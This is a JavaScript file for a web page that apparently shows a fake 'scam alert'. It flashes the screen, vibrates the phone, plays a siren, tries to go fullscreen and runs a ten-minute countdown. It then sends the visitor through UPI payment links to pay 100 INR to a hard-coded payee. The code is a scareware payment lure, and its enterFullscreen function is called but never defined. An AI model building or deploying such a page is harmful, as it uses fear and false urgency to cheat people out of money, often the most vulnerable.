document.addEventListener('DOMContentLoaded', function() {
  const warningImage = document.getElementById('warningImage');
  const siren = document.getElementById('siren');

  // Click/tap on image triggers the scam alert
  warningImage.addEventListener('click', function() {
    showScamAlert();
    enterFullscreen();
  });

  // Or automatically proceed after 5 seconds
  setTimeout(showScamAlert, 5000);
});

function showScamAlert() {
  document.getElementById('warningScreen').classList.add('hidden');
  document.getElementById('scamAlert').classList.remove('hidden');
  
  // Start effects
  document.body.classList.add('flashing');
  if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
  
  // Play siren sound
  const siren = document.getElementById('siren');
  siren.play().catch(e => console.log("Audio blocked:", e));
  
  // Start countdown
  startCountdown();
}


function startCountdown() {
  let time = 600;
  const element = document.getElementById('countdown');

  const timer = setInterval(() => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    element.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    if (--time < 0) {
      clearInterval(timer);
      element.textContent = '00:00';
      element.style.color = 'red';
    }
  }, 1000);
}

function Payment(app) {
  if ("vibrate" in navigator) navigator.vibrate(200);

  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
  let upiURL = baseUPI;

  if (app === "PayTM") {
    upiURL += "&mc=0000&mode=02&orgid=159761";
  } else if (app === "PhonePe") {
    upiURL += "&mc=0000&mode=04&orgid=189999";
  } else if (app === "GPay") {
    upiURL += "&mc=0000&mode=05&orgid=000000";
  }

  window.location.href = upiURL;
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'F11' || e.key === 'Escape') {
    document.exitFullscreen();
  }
});

